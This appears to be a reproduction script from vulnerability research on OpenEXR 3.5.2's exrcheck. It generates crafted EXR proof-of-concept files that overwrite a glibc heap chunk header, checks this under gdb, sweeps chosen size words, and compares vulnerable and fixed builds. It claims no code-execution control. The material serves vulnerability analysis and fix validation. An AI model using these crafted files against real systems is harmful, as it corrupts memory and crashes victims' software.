#!/bin/sh
# W186: one-command replay of the live malloc-metadata reach boundary.
#  (1) The W184 survivable 128-byte file-chosen copy in UNMODIFIED exrcheck
#      lands on the adjacent glibc chunk header; a watchpoint proves the size
#      word at dst+264 changes from 0x31 to a fully file-chosen 0x41.
#  (2) NEGATIVE: the chosen word does not steer allocator behavior.  A sweep
#      of eight words and a uniform-byte control all give the same outcome;
#      byte-identical PoCs differ only with process heap layout (filename
#      length), clean "bad" rc 1 vs "munmap_chunk(): invalid pointer" rc 134.
# No pointer/IP control, command, marker, wire or witness verdict is claimed.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-mixed evidence

if [ ! -x bin-vuln-plain/gen_baseline_deep_mixed ]; then
    BUILD=build-vuln-plain
    SRC=src/openexr-3.5.2
    CORE="$BUILD/src/lib/OpenEXRCore"
    GEN="$BUILD/cmake"
    IMATH_COMPAT="$BUILD/OpenEXR_ImathIncludeCompat"
    IMATH_CONFIG="$BUILD/_deps/imath-build/config"
    IMATH_SRC="$BUILD/_deps/imath-src/src"
    OPENEXR_SRC="$SRC/src/lib"
    LIBS="$BUILD/src/lib/OpenEXRUtil/libOpenEXRUtil*.a $BUILD/src/lib/OpenEXR/libOpenEXR-3_5*.a $BUILD/src/lib/OpenEXRCore/libOpenEXRCore*.a $BUILD/src/lib/IlmThread/libIlmThread*.a $BUILD/src/lib/Iex/libIex*.a"
    IMATH_LIB=$(find "$BUILD/_deps" -name 'libImath*.a' | sort | tr '\n' ' ')
    INC="-I$CORE -I$SRC/src/lib/OpenEXRCore -I$GEN -I$IMATH_COMPAT -I$IMATH_CONFIG -I$IMATH_SRC -I$OPENEXR_SRC/OpenEXR -I$OPENEXR_SRC/Iex -I$OPENEXR_SRC/IlmThread"
    g++ -g -O1 $INC cases/gen_baseline_deep_mixed.cpp $LIBS $IMATH_LIB \
        -ldeflate -lzstd -lz -lpthread -lm \
        -o bin-vuln-plain/gen_baseline_deep_mixed
fi

BASE=work-mixed/baseline_deep_mixed.exr
SHORT=work-mixed/w186a.exr
LONG=work-mixed/w186longname.exr
UNIF=work-mixed/w186u.exr
bin-vuln-plain/gen_baseline_deep_mixed "$BASE" > /dev/null
python3 cases/make_size_word_poc.py "$BASE" "$SHORT" 0x41 > evidence/w186-gen.out
python3 cases/make_size_word_poc.py "$BASE" "$LONG" 0x41 >> evidence/w186-gen.out
python3 cases/make_poc_mixed_full.py "$BASE" "$UNIF" 64 0x5a 256 \
    >> evidence/w186-gen.out

hash() { sha256sum "$1" | cut -d' ' -f1; }
test "$(hash "$BASE")" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04
test "$(hash "$SHORT")" = \
    76db069d0677e5f9bfb87336a9c3a69a54e1dac2499248129339cc705da73e1e
test "$(hash "$LONG")" = "$(hash "$SHORT")"
test "$(hash "$UNIF")" = \
    2ab3ea9751736720030d606cd3dd947dd000039da537a47bf822f1f18dd618f7

gdb -q -batch \
    -ex 'set pagination off' -ex 'set confirm off' -ex 'set print pretty off' \
    -ex 'set disable-randomization on' \
    -ex 'break sort2_4ByteChannels_tiled' -ex "run -c $SHORT" \
    -x harness/chunk-header.cmd build-vuln-plain/bin/exrcheck 2>&1 \
    | grep -E '^(ENTRY|WATCH|FINISHED)' > evidence/w186-gdb-chunk.out
grep -Fqx 'ENTRY own_size=0x111 next_prev=0x40000000010000 next_size=0x31' \
    evidence/w186-gdb-chunk.out
grep -Fqx 'WATCH next_prev=0x5a5a5a5a5a5a5a5a next_size=0x41 src8=5a5a5a5a5a5a5a5a4100000000000000' \
    evidence/w186-gdb-chunk.out
grep -Fqx 'FINISHED' evidence/w186-gdb-chunk.out

# Byte-identical PoC, two filename lengths: layout, not chosen word, decides.
run_rc() { out=$1; shift; if "$@" > "$out" 2>&1; then RC=0; else RC=$?; fi; }
run_rc evidence/w186-plain-short.out build-vuln-plain/bin/exrcheck -c "$SHORT"
test "$RC" -eq 134
grep -Fq 'munmap_chunk(): invalid pointer' evidence/w186-plain-short.out
run_rc evidence/w186-plain-long.out build-vuln-plain/bin/exrcheck -c "$LONG"
test "$RC" -eq 1
grep -Fq 'bad' evidence/w186-plain-long.out
run_rc evidence/w186-baseline.out build-vuln-plain/bin/exrcheck -c "$BASE"
test "$RC" -eq 0
grep -Fq 'baseline_deep_mixed.exr OK' evidence/w186-baseline.out
run_rc evidence/w186-fixed.out build-fixed-plain/bin/exrcheck -c "$SHORT"
test "$RC" -eq 1
grep -Fq 'bad' evidence/w186-fixed.out

bin-fixed-asan/guarded_harness "$SHORT" 2>&1 \
    | grep -E '^(DECODE|GUARD-TOTAL)' > evidence/w186-fixed-guard.out
grep -Fqx 'DECODE rv=23 EXR_ERR_CORRUPT_CHUNK' evidence/w186-fixed-guard.out
grep -Fqx 'GUARD-TOTAL post-decode changed=0' evidence/w186-fixed-guard.out
bin-vuln-plain/guarded_harness "$SHORT" 2>&1 \
    | grep -E '^(DECODE|GUARD-CHANGE|GUARD-TOTAL)' > evidence/w186-guard.out
grep -Fqx 'DECODE rv=31 EXR_ERR_INVALID_SAMPLE_DATA' evidence/w186-guard.out
grep -Fqx 'GUARD-CHANGE alloc=24 size=256 changed=128 first=+0 expected=0x7c actual@first=0x5a' \
    evidence/w186-guard.out

# All chosen words, plus the uniform control, under one fixed-length path.
: > evidence/w186-size-sweep.out
for spec in 0021 0031 0041 0051 0091 0101 1001 1011; do
    f=work-mixed/w186s$spec.exr
    python3 cases/make_size_word_poc.py "$BASE" "$f" "0x$spec" > /dev/null
    run_rc /tmp/w186-sweep-$$.out build-vuln-plain/bin/exrcheck -c "$f"
    msg=$(grep -oE 'bad|munmap_chunk\(\): invalid pointer|invalid next size' \
        /tmp/w186-sweep-$$.out | head -1)
    printf 'word=0x%s rc=%d msg=%s\n' "$spec" "$RC" "$msg" \
        >> evidence/w186-size-sweep.out
done
cp "$UNIF" work-mixed/w186sffff.exr
run_rc /tmp/w186-sweep-$$.out build-vuln-plain/bin/exrcheck -c \
    work-mixed/w186sffff.exr
msg=$(grep -oE 'bad|munmap_chunk\(\): invalid pointer|invalid next size' \
    /tmp/w186-sweep-$$.out | head -1)
printf 'word=uniform rc=%d msg=%s\n' "$RC" "$msg" >> evidence/w186-size-sweep.out
rm -f /tmp/w186-sweep-$$.out
test "$(wc -l < evidence/w186-size-sweep.out)" -eq 9
test "$(cut -d' ' -f2- evidence/w186-size-sweep.out | sort -u | wc -l)" -eq 1

printf 'RESULT PASS\n'
sha256sum evidence/w186-*.out
